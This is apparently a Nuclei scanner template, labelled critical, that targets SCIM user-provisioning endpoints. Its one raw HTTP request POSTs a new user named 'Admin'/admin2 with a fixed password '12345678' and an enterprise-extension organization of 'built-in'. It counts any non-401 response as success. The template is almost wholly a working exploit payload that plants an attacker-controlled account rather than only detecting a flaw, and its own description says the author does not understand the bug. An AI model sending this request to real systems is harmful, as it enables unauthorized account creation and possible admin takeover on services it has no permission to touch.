id: scim-exploit

info:
  name: SCIM exploit
  author: ayuxsec
  severity: critical
  description: Some schema exploit idk about but read from here: https://blog.doyensec.com/2025/05/08/scim-hunting.html

http:
  - raw:
      - |
        POST /Users HTTP/1.1
        Host: {{Host}}
        Content-Type: application/scim+json
        Content-Length: 377

        {
          "active": true,
          "displayName": "Admin",
          "emails": [
            {
              "value": "admin2@victim.com"
            }
          ],
          "password": "12345678",
          "nickName": "Attacker",
          "schemas": [
            "urn:ietf:params:scim:schemas:core:2.0:User",
            "urn:ietf:params:scim:schemas:extension:enterprise:2.0:User"
          ],
          "urn:ietf:params:scim:schemas:extension:enterprise:2.0:User": {
            "organization": "built-in"
          },
          "userName": "admin2",
          "userType": "normal-user"
        }
      
    matchers:
      - type: dsl
        dsl:
          - "status_code != 401"